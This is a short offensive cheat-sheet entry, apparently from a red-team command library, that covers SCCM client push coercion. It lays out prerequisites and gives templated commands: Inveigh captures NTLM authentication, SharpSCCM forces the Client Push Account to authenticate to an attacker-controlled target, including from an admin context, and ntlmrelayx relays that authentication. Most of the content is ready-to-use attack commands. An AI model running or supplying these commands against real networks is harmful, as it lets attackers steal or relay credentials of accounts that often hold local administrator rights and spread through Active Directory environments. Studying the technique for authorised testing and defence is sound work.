---
technique: SCCMClientPushCoercion
category: sccm-mecm
targets: SCCM Client Push Account
protocols: SMB, NTLM
remote_capable: true
tags: sccm mecm coercion client-push ntlm relay capture ad
---

# SCCMClientPushCoercion

SCCM Client Push Accounts authenticate to hosts during client installation and often have local administrator rights on workstations. A compromised SCCM client or SCCM operator path can force client push authentication to an attacker listener for capture or relay.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| SCCM client path | Coercion starts from a client or SCCM management context |
| Listener | Capture with Inveigh or relay with ntlmrelayx before triggering push |
| Cleanup plan | Forced client push can leave SCCM device records behind |

## Windows

### Inveigh listener

#powershell #inveigh #capture

Capture SCCM Client Push Account NTLM authentication on Windows.

```powershell title:"Capture SCCM client push auth with Inveigh"
Inveigh.exe
```
<!-- cheat -->

### SharpSCCM client push

#powershell #sharpsccm #coercion

Trigger SCCM client push authentication toward an attacker-controlled target.

```powershell title:"Trigger SCCM client push authentication"
.\SharpSCCM.exe invoke client-push -t "$target"
```
<!-- cheat
var target
-->

### SharpSCCM admin client push

#powershell #sharpsccm #coercion

Trigger SCCM client push authentication from an SCCM admin context without creating a cleanup burden.

```powershell title:"Trigger SCCM admin client push authentication"
.\SharpSCCM.exe invoke client-push -t "$target" --as-admin
```
<!-- cheat
var target
-->

## Linux

### ntlmrelayx client push relay

#python #impacket #relay

Relay SCCM Client Push Account authentication to a target service.

```sh title:"Relay SCCM client push authentication with ntlmrelayx"
ntlmrelayx.py -smb2support -socks -ts -ip "$lhost" -t "$relay_target"
```
<!-- cheat
import tun_ip
var relay_target
-->
